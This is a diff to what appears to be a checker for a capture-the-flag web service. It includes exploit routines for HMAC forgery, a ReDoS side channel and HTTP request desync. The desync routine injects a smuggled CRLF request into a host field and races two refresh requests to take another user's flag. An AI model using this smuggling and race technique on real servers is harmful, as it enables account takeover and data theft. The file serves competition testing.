@@ -46,7 +46,6 @@ from utils import (
 )
 
 _CHECKER = Enochecker("greple", 7777)
-_REFRESH_HASH_RE = re.compile(r"refresh\('([0-9a-f]{56})'\)")
 
 
 @_CHECKER.register_dependency
@@ -98,7 +97,7 @@ async def _putflag_shor_url(task: PutflagCheckerTaskMessage, client: Client, db:
     await db.set("username", username)
     await db.set("cookie", client.cookies["user_account"])
 
-    return username
+    return f"user:{username}"
 
 
 @_CHECKER.getflag(1)
@@ -144,12 +143,11 @@ async def _putflag_api_key(task: PutflagCheckerTaskMessage, client: Client, db: 
 
     await verify_netloc(client, base_url.netloc.decode(), task.flag)
 
-    url = str(base_url.join(f"/{letter_noise(128)}"))
-    await submit_page(client, False, str(url))
+    refresh_hash = await submit_page(client, False, str(base_url.join(f"/{letter_noise(128)}")))
 
     await db.set("cookie", client.cookies["user_account"])
 
-    return url
+    return refresh_hash
 
 
 @_CHECKER.getflag(2)
@@ -253,6 +251,7 @@ async def _verify_netloc(client: Client) -> None:
 @_CHECKER.exploit(0)
 async def _exploit_hmac(client: Client, task: ExploitCheckerTaskMessage) -> str:
     assert task.attack_info is not None
+    assert task.attack_info.startswith(client.base_url.netloc.decode().split(":")[0])
 
     username = username_noise(128)
 
@@ -275,6 +274,7 @@ async def _exploit_sca(
     task: ExploitCheckerTaskMessage,
 ) -> str:
     assert task.attack_info is not None
+    assert task.attack_info.startswith("user:")
 
     cal = await calibrate_redos(logger, client)
 
@@ -290,41 +290,36 @@ async def _exploit_sca(
 async def _exploit_desync(client: Client, task: ExploitCheckerTaskMessage) -> str:
     assert task.attack_info is not None
 
-    url = httpx.URL(task.attack_info)
-    assert url.is_absolute_url
+    assert client.base_url.port is not None
+    base_url = client.base_url.copy_with(port=client.base_url.port + 1)
 
     username = username_noise(128)
     await register_user(client, username)
 
-    await submit_page(client, False, task.attack_info)
+    refresh_hash = await submit_page(client, False, str(base_url.join("/exploit")))
+    assert len(refresh_hash) == len(task.attack_info)
 
-    netloc = url.netloc.decode()
+    netloc = base_url.netloc.decode()
     cl = (
         101  # extra headers
         + 173  # next request w/o flag & path
         + 24  # path
-        + 51  # flag
+        + {
+            "🥺[A-Za-z0-9+\\/=]{48}🥺🥺": 48 + 3 * 4,
+            "ENO[A-Za-z0-9+\\/=]{48}": 48 + 3,
+        }[task.flag_regex]
     )
     dump = f"/{letter_noise(128)}"
-    netloc_hash = await verify_netloc(
+    await verify_netloc(
         client,
         netloc,
         f"\r\n\r\nPOST {dump} HTTP/1.1\r\nhost:{netloc}\r\ncontent-length:{cl}\r\n",
     )
 
-    t = await find_token(client, username)
-
-    body = await token(client, netloc_hash, t)
-    refresh_hash = re.findall(
-        f"{re.escape(task.attack_info)}</td><td>([^<]*)</td><td>No</td><td><a href=\"javascript:refresh\\('([^']*)",
-        unescape(body),
-    )
-    assert len(refresh_hash) == 2
-
     # TODO: ensure timing is tight enough
     await asyncio.gather(
-        client.post("/refresh", data={"hash": next(h for u, h in refresh_hash if u == username)}),
-        client.post("/refresh", data={"hash": next(h for u, h in refresh_hash if u != username)}),
+        client.post("/refresh", data={"hash": refresh_hash}),
+        client.post("/refresh", data={"hash": task.attack_info}),
     )
 
     while True:
